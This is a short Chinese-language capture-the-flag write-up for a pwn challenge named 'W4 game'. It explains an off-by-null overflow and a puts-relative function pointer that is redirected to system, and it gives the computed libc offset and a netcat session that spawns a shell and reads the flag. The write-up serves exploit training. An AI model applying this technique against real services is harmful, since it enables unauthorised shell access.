# W4 game

## 文件分析

下载`pwn`, NX on, PIE on, Canary off, RELRO full  
ghidra分析为64位程序

## 逆向

观察程序，发现 ~~原神~~ 函数末尾运行了`(*(puts + (-(long)cnt - (long)offset)))(bytes);`  
那么只要控制cnt和offset，就可以运行system；控制bytes可以打开shell

cnt在完成委托每次+0x10000，而offset通过输入%hd获得；  
bytes在对肯德基爷爷的话中可以输入；  
现在唯一的问题是：怎样既选择派蒙又选择三月七以满足`if ((flag_paimon != 1) || (flag_march7 != 1)) break;`
的条件？

发现myread函数存在**off-by-null**溢出，动调发现溢出的刚好是选择的伙伴变量，
那么只要先选三月七，然后溢出修改伙伴为派蒙即可

虽然题目中完成4次委托给了system地址，但是libc给了...直接在libc中找偏移，
得出`system - puts`=0x38592

## EXPLOIT

```
> ncat node4.buuoj.cn 29415
请选择你的伙伴1
我永远喜欢三月七!
现在你可以开始探险了1.扣1送原石2.扣2送kfc联名套餐2
你有什么想对肯德基爷爷说的吗?
/bin/sh
1.扣1送原石2.扣2送kfc联名套餐1
恭喜你完成一次委托1.扣1送原石2.扣2送kfc联名套餐1
恭喜你完成一次委托1.扣1送原石2.扣2送kfc联名套餐1
恭喜你完成一次委托1.扣1送原石2.扣2送kfc联名套餐3
you are good mihoyo player!
8592
cat flag
flag{removed}
```

Done.
